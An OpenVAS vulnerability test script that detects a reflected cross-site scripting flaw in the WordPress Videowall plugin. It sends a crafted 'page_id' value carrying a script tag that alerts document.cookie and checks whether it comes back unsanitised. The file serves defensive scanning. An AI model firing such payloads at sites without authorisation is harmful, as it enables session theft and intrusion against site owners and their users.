###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_videowall_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WordPress Videowall Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804031";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-22 20:32:04 +0530 (Tue, 22 Oct 2013)");
  script_name("WordPress Videowall Plugin Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with WordPress Videowall plugin and is prone to cross
site scripting vulnerability.";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to read the
cookie or not.";

  tag_insight =
"Input passed via the 'page_id' parameter to '/videowall/index.php' script
is not properly sanitized before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"WordPress videowall Plugin.";

  tag_solution =
"No solution or patch is available as of 22nd October, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://wordpress.org/plugins";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/98765");
  script_xref(name : "URL" , value : "http://www.iedb.ir/exploits-716.html");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Oct/98");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/123693");
  script_summary("Check if WordPress videowall Plugin is prone to xss");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/videowall/index.php'+
            '?page_id=8"><script>alert(document.cookie)</script>';

## Check Exploit is working
## Application Confirmation is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\)</script>"))
{
  security_warning(http_port);
  exit(0);
}
